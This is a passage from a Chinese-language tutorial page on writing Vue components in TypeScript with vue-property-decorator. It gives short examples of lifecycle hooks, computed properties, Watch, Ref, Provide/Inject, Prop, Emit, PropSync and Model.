  <span>// 局部过滤</span>
  <span>filters</span><span>:</span> <span>{</span>
    <span>addOne</span><span>(</span><span><span>num</span><span>:</span> number<span>,</span> <span>towParam</span><span>:</span> string</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>towParam<span>,</span> <span>"局部过滤器"</span><span>)</span><span>;</span>
      <span>return</span> num <span>+</span> <span>3</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>//混入</span>
  <span>// mixins: [ResizeMixin]</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> <span>num</span><span>:</span> number <span>=</span> <span>1</span><span>;</span> <span>//定义一个变量</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>要使用 Ts 需要在 script 标签的 lang 属性值设为 ts</p>
</div>
<h3 id="命周期" tabindex="-1"> 命周期</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>home<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>

@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"LifeCycle"</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> num <span>=</span> <span>1</span><span>;</span>
  <span>private</span> <span>created</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>num<span>)</span><span>;</span>
  <span>}</span>
  <span>private</span> <span>mounted</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>num<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="方法、属性" tabindex="-1"> 方法、属性</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>home<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>addAge<span>"</span></span><span>></span></span>加1<span><span><span>&lt;/</span>button</span><span>></span></span>
    {{ num }}
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"AttrMethod"</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> num <span>=</span> <span>1</span><span>;</span> <span>//属性</span>
  <span>private</span> checked <span>=</span> <span>true</span><span>;</span>

  <span>//方法</span>
  <span>private</span> <span>addAge</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>this</span><span>.</span>num<span>++</span><span>;</span>
    <span>this</span><span>.</span>checked <span>=</span> <span>false</span><span>;</span>
  <span>}</span>

  <span>private</span> <span>mounted</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>num<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="computer-计算属性" tabindex="-1"> computer(计算属性)</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>computer<span>"</span></span><span>></span></span>
    {{ count(this.num, 2) }}
    {{ msg }}
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Computers"</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> num <span>=</span> <span>1</span><span>;</span>
  <span>private</span> <span>mounted</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>num<span>)</span><span>;</span>
  <span>}</span>
  <span>/*计算属性*/</span>

  <span>//传参写法</span>
  <span>private</span> <span>get</span> <span>count</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>function</span> <span>(</span><span><span>num</span><span>:</span> number<span>,</span> <span>numbers</span><span>:</span> number</span><span>)</span> <span>{</span>
      <span>return</span> num <span>+</span> numbers<span>;</span>
    <span>}</span><span>;</span>
  <span>}</span>

  <span>//普通写法</span>
  <span>private</span> <span>get</span> <span>msg</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>"普通写法的计算属性"</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="watch-监听" tabindex="-1"> watch(监听)</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>watch<span>"</span></span><span>></span></span>
    {{ num }}
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue<span>,</span> Watch <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Watch"</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> num <span>=</span> <span>1</span><span>;</span>
  <span>private</span> <span>mounted</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>this</span><span>.</span><span>timeOut</span><span>(</span><span>)</span><span>;</span>
  <span>}</span>
  <span>private</span> <span>timeOut</span><span>(</span><span>)</span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>this</span><span>.</span>num<span>++</span><span>;</span>
    <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>
  <span>}</span>
  <span>//监听</span>
  @<span>Watch</span><span>(</span><span>"num"</span><span>,</span> <span>{</span> <span>immediate</span><span>:</span> <span>true</span><span>,</span> <span>deep</span><span>:</span> <span>true</span> <span>}</span><span>)</span>
  <span>onNumChange</span><span>(</span><span><span>val</span><span>:</span> string<span>,</span> <span>old</span><span>:</span> string</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>val<span>,</span> old<span>,</span> <span>"watch"</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p><code>onNumChange</code> 方法要紧挨着 <code>@Watch</code>,它们中间不能有其他代码,而且这个方法名称可以自定义, 没有强制要求。</p>
</div>
<h3 id="ref" tabindex="-1"> ref</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>watch<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>img</span> <span>alt</span><span><span>=</span><span>"</span>Vue logo<span>"</span></span> <span>src</span><span><span>=</span><span>"</span>../assets/logo.png<span>"</span></span> <span>ref</span><span><span>=</span><span>"</span>img<span>"</span></span> <span>/></span></span>
    {{ num }}
    <span><span><span>&lt;</span>Test</span> <span>ref</span><span><span>=</span><span>"</span>test<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue<span>,</span> Ref <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> Test <span>from</span> <span>"@/components/Test.vue"</span><span>;</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Watch"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    Test<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> num <span>=</span> <span>1</span><span>;</span>
  @<span>Ref</span><span>(</span><span>)</span> readonly test<span>!</span><span>:</span> Test<span>;</span> <span>//引入的组件的ref</span>
  @<span>Ref</span><span>(</span><span>"img"</span><span>)</span> readonly img<span>!</span><span>:</span> HTMLButtonElement<span>;</span> <span>//普通html标签的ref</span>
  <span>private</span> <span>mounted</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>
      <span>"普通的ref使用方式:"</span><span>,</span>
      <span>this</span><span>.</span>$refs<span>.</span>test<span>,</span>
      <span>"定义变量的ref使用方式:"</span><span>,</span>
      <span>this</span><span>.</span>test<span>,</span>
      <span>"引入组件的ref"</span>
    <span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>img<span>,</span> <span>this</span><span>.</span>$refs<span>.</span>img<span>,</span> <span>"普通img标签的ref"</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="依赖注入" tabindex="-1"> 依赖注入</h3>
<h4 id="provide" tabindex="-1"> Provide</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>home<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>Inject</span> <span>ref</span><span><span>=</span><span>"</span>helloWorld<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>// @ is an alias to /src</span>
<span>/*eslint-disable */</span>
<span>import</span> <span>{</span> Component<span>,</span> Vue<span>,</span> Provide <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> Inject <span>from</span> <span>"@/components/Inject.vue"</span><span>;</span>

<span>const</span> symbol <span>=</span> <span>Symbol</span><span>(</span><span>"baz"</span><span>)</span><span>;</span>
<span>//装饰器注明此类</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Provide"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    Inject<span>,</span>
  <span>}</span><span>,</span>
  <span>// mixins: [ResizeMixin]</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  @<span>Provide</span><span>(</span><span>)</span> foo <span>=</span> <span>"foo"</span><span>;</span> <span>//依赖注入</span>
  @<span>Provide</span><span>(</span><span>)</span> optional <span>=</span> <span>"optional"</span><span>;</span> <span>//依赖注入</span>
  @<span>Provide</span><span>(</span><span>"bar"</span><span>)</span> baz <span>=</span> <span>"bar"</span><span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="inject" tabindex="-1"> Inject</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>hello<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>h1</span> <span>@click</span><span><span>=</span><span>"</span>returnValue<span>"</span></span><span>></span></span>{{ msg }}<span><span><span>&lt;/</span>h1</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span>
  Component<span>,</span>
  Vue<span>,</span>
  Inject
<span>}</span> <span>from</span> <span>'vue-property-decorator'</span>
@Component
<span>export</span> <span>default</span> <span>class</span> <span>HelloWorld</span> <span>extends</span> <span>Vue</span> <span>{</span>
  @<span>Inject</span><span>(</span><span>)</span> readonly foo<span>!</span><span>:</span> string <span>//接收依赖注入的值</span>
  @<span>Inject</span><span>(</span><span>{</span> <span>from</span><span>:</span> <span>'optional'</span><span>,</span> <span>default</span><span>:</span> <span>'default'</span> <span>}</span><span>)</span> readonly optional<span>!</span><span>:</span> string <span>//父组件, 爷爷组件没传optional时, 使用default设置默认值</span>
  @<span>Inject</span><span>(</span><span>'bar'</span><span>)</span> readonly bar<span>!</span><span>:</span> string

  <span>private</span> moun <span>ted</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span> <span>22</span><span>,</span> <span>this</span><span>.</span>foo<span>,</span> <span>this</span><span>.</span>optional<span>,</span> <span>this</span><span>.</span>bar<span>)</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="prop" tabindex="-1"> Prop</h3>
<p>子组接收父组件传进来的值</p>
<h4 id="父组件" tabindex="-1"> 父组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>home<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>Props</span> <span>:msg</span><span><span>=</span><span>"</span>msg<span>"</span></span> <span>prop-c</span><span><span>=</span><span>"</span>11<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>// @ is an alias to /src</span>
<span>/*eslint-disable */</span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> Props <span>from</span> <span>"@/components/Prop.vue"</span><span>;</span>

<span>const</span> symbol <span>=</span> <span>Symbol</span><span>(</span><span>"baz"</span><span>)</span><span>;</span>
<span>//装饰器注明此类</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Prop"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    Props<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> <span>msg</span><span>:</span> string <span>=</span> <span>"hello"</span><span>;</span>
  <span>private</span> <span>name</span><span>:</span> string <span>=</span> <span>"sss"</span><span>;</span>
  <span>private</span> <span>checked</span><span>:</span> boolean <span>=</span> <span>true</span><span>;</span>
  <span>private</span> <span>num</span><span>:</span> number <span>=</span> <span>1</span><span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="子组件" tabindex="-1"> 子组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>hello<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>h1</span><span>></span></span>{{ msg }}<span><span><span>&lt;/</span>h1</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>{{ propB }}<span><span><span>&lt;/</span>span</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>{{ propC }}<span><span><span>&lt;/</span>span</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Prop<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@Component
<span>export</span> <span>default</span> <span>class</span> <span>HelloWorld</span> <span>extends</span> <span>Vue</span> <span>{</span>
  @<span>Prop</span><span>(</span><span>)</span> <span>private</span> msg<span>!</span><span>:</span> string<span>;</span> <span>//!, 非null和undefined</span>
  @<span>Prop</span><span>(</span>Number<span>)</span> readonly propA<span>:</span> number <span>|</span> <span>undefined</span><span>;</span>
  @<span>Prop</span><span>(</span><span>{</span> <span>default</span><span>:</span> <span>"default value"</span> <span>}</span><span>)</span> readonly propB<span>!</span><span>:</span> string<span>;</span>
  @<span>Prop</span><span>(</span><span>[</span>String<span>,</span> Boolean<span>]</span><span>)</span> readonly propC<span>:</span> string <span>|</span> boolean <span>|</span> <span>undefined</span><span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="emit" tabindex="-1"> Emit</h3>
<p>向父组件发射个方法</p>
<h4 id="父组件-1" tabindex="-1"> 父组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>home<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>EmitChild</span> <span>@return-value</span><span><span>=</span><span>"</span>returnValue<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>// @ is an alias to /src</span>
<span>/*eslint-disable */</span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> EmitChild <span>from</span> <span>"@/components/Emit.vue"</span><span>;</span>

<span>const</span> symbol <span>=</span> <span>Symbol</span><span>(</span><span>"baz"</span><span>)</span><span>;</span>
<span>//装饰器注明此类</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Emit"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    EmitChild<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> <span>returnValue</span><span>(</span>aa<span>:</span> number<span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>aa<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="子组件-1" tabindex="-1"> 子组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>hello<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>p</span> <span>@click</span><span><span>=</span><span>"</span>returnValue<span>"</span></span><span>></span></span>emit<span><span><span>&lt;/</span>p</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue<span>,</span> Emit <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@Component
<span>export</span> <span>default</span> <span>class</span> <span>HelloWorld</span> <span>extends</span> <span>Vue</span> <span>{</span>
  @<span>Emit</span><span>(</span><span>)</span> <span>//把方法发射出去可以让父组件使用</span>
  <span>returnValue</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>10</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="propsync" tabindex="-1"> PropSync</h3>
<p>实现 <code>sync</code> 修饰符(<code>prop</code> 双向绑定)</p>
<h4 id="父组件-2" tabindex="-1"> 父组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>exportName<span>"</span></span><span>></span></span>输出name<span><span><span>&lt;/</span>button</span><span>></span></span>
    <span><span><span>&lt;</span>PropSyncChild</span> <span>:name.sync</span><span><span>=</span><span>"</span>name<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>// @ is an alias to /src</span>
<span>/*eslint-disable */</span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> PropSyncChild <span>from</span> <span>"@/components/PropSync.vue"</span><span>;</span>

<span>//装饰器注明此类</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"PropSync"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    PropSyncChild<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> <span>name</span><span>:</span> string <span>=</span> <span>"sss"</span><span>;</span>
  <span>exportName</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="子组件-2" tabindex="-1"> 子组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>hello<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>p</span> <span>@click</span><span><span>=</span><span>"</span>setSyncedName<span>"</span></span><span>></span></span>我是子组件： 同步、子组件修改父组件<span><span><span>&lt;/</span>p</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue<span>,</span> PropSync <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@Component
<span>export</span> <span>default</span> <span>class</span> <span>HelloWorld</span> <span>extends</span> <span>Vue</span> <span>{</span>
  @<span>PropSync</span><span>(</span><span>"name"</span><span>,</span> <span>{</span> <span>type</span><span>:</span> String <span>}</span><span>)</span> syncedName<span>!</span><span>:</span> string<span>;</span> <span>//同步, 可让子组件修改父组件的值</span>
  <span>public</span> <span>setSyncedName</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>"prop双向绑定"</span><span>)</span><span>;</span>
    <span>this</span><span>.</span>syncedName <span>=</span> <span>"同步、子组件修改父组件"</span><span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="model" tabindex="-1"> Model</h3>
<p>实现 <code>v-model</code> 双向绑定</p>
<h4 id="父组件-3" tabindex="-1"> 父组件</h4>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>setChecked<span>"</span></span><span>></span></span>修改checked<span><span><span>&lt;/</span>button</span><span>></span></span>
    <span><span><span>&lt;</span>ModelChild</span> <span>v-model</span><span><span>=</span><span>"</span>checked<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
<span>import</span> ModelChild <span>from</span> <span>"@/components/Model.vue"</span><span>;</span>
<span>//装饰器注明此类</span>
@<span>Component</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"Model"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    ModelChild<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>
<span>export</span> <span>default</span> <span>class</span> <span>extends</span> Vue <span>{</span>
  <span>private</span> checked <span>=</span> <span>false</span><span>;</span>
  <span>setChecked</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>this</span><span>.</span>checked <span>=</span> <span>!</span><span>this</span><span>.</span>checked<span>;</span>
  <span>}</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="子组件-3" tabindex="-1"> 子组件</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
